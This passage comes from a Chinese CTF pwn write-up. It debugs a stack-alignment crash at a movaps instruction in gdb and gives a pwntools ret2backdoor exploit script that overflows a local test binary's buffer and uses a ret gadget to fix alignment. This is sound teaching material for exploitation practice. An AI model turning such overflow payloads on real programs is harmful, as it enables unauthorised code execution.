+<p>左面显示处于暂停状态，选择左面，然后按一下回车，得到如下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508204850712.png" alt="image-20230508204850712" style="zoom:80%;" />
+
+<p>剩下只需要分析右面的gdb中的信息即可</p>
+<p>可以使用<code>ni</code>单步分析</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508205827966.png" alt="image-20230508205827966" style="zoom:80%;" />
+
+<p>也可以使用<code>finish</code>跳出当前的系统函数</p>
+<p>几次后，得到如下的状态，可以看到<code>sub_01111101</code>函数执行结束后到后门函数那边去了，接下来为了避免跳出关键函数，使用<code>ni</code>单步调试</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210028290.png" alt="image-20230508210028290" style="zoom:80%;" />
+
+<p>如下，接下来再填入一次<code>ni</code>就是报错的地方了，其实这里已经可以看到栈已经不对齐了(<code>rsp</code>末尾是8)</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211555679.png" alt="image-20230508211555679" style="zoom:80%;" />
+
+<p>调试到<code>movaps</code>指令时候如下所示，显然，<code>rsp=0x7fffffffdba8</code>，所以造成了溢出的失败</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210350739.png" alt="image-20230508210350739" style="zoom:80%;" />
+
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508210534588.png" alt="image-20230508210534588" style="zoom:80%;" />
+
+<p>再写一个栈对齐的exp</p>
+<p><strong>exp</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=remote(&#x27;127.0.0.1&#x27;,9999)</span></span><br><span class="line">io=process(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">junk=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br><span class="line">shellc=asm(shellcraft.sh())</span><br><span class="line">backdoor=<span class="number">0x0000000000401196</span></span><br><span class="line">main= elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">log.info(shellc)</span><br><span class="line"></span><br><span class="line">payload=junk+p64(ret)+p64(backdoor)+<span class="string">b&#x27;deadbeef&#x27;</span>	<span class="comment"># Stack alignment</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里就直接去调试了，调试的过程和上面一模一样</p>
+<p>调试结果如下</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211041861.png" alt="image-20230508211041861" style="zoom:80%;" />
+
+<p>再填入<code>ni</code>就可以程序没有跳转到报错的<code>movaps</code>那边，而是正常的结束了</p>
+<img src="https://cdn.jsdelivr.net/gh/lucky-xiaobai/CTFPicture/img/image-20230508211202682.png" alt="image-20230508211202682" style="zoom:80%;" />
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>检测栈对齐其实就是<code>movaps</code>指令造成的，可以填充一个或多个<code>ret</code>指令来使栈上的数据对齐。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+</search>
